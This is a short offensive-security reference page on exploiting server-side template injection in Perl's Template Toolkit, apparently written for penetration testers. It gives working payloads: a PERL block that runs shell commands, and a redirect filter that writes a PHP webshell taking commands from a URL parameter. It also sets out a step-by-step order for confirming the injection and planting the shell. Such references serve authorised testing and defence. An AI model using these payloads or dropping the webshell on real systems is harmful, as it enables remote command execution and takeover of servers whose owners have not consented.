---
title: "Template Toolkit server-side template injection"
description: "Exploiting Template Toolkit (TT2) SSTI in Perl: confirming with [% 7*7 %], running Perl through PERL/RAWPERL blocks when EVAL_PERL is set, and reaching command execution via plugins and filters."
keywords:
  - Template Toolkit SSTI
  - EVAL_PERL
  - PERL block
  - exec filter
  - TT2 injection
---

# Template Toolkit

Template Toolkit (TT2) uses `[% ... %]` directives. Confirm with `[% 7*7 %]` rendering `49`. TT2 keeps raw Perl behind the `EVAL_PERL` option, so the exploitation path depends on how the processor was configured.

When `EVAL_PERL` is enabled, the `PERL` and `RAWPERL` blocks execute arbitrary Perl, which is direct RCE:

```tt
[% PERL %]
  print `id`;
[% END %]
```

`RAWPERL` behaves the same with less wrapping. Backticks, `system`, and `exec` inside the block all run commands.

When `EVAL_PERL` is off, look to plugins and filters. TT2 can load plugins by name, and some expose dangerous behavior. The `redirect` and `Datafile` features write files, and filters can be chained to the shell where the configuration permits:

```tt
[% USE Datafile('/var/www/html/shell.txt') %]
[% FILTER redirect('shell.php') %]<?php system($_GET['c']); ?>[% END %]
```

The `redirect` filter writes the filtered content to a path relative to the processor's `OUTPUT_PATH`, which drops a webshell when that path is web-served and writable. TT2 also historically allowed calling methods on objects placed in the stash, so an application that exposes an object with a command-running or file-touching method widens the reachable surface.

The practical order is: confirm with `[% 7*7 %]`, try a `PERL` block (works only under `EVAL_PERL`), and if that is blocked, enumerate loadable plugins and attempt the `redirect`/`Datafile` file-write to plant a shell. The injection requires the attacker input to be processed as template text; values passed into a fixed template are data. Because the high-impact path is gated on `EVAL_PERL` and on a writable, served `OUTPUT_PATH`, assess those conditions before rating the finding.

## Tools

- tplmap, SSTImap

## References

- Template Toolkit documentation: PERL/RAWPERL, EVAL_PERL, filters, plugins
- PortSwigger Web Security Academy: Server-side template injection
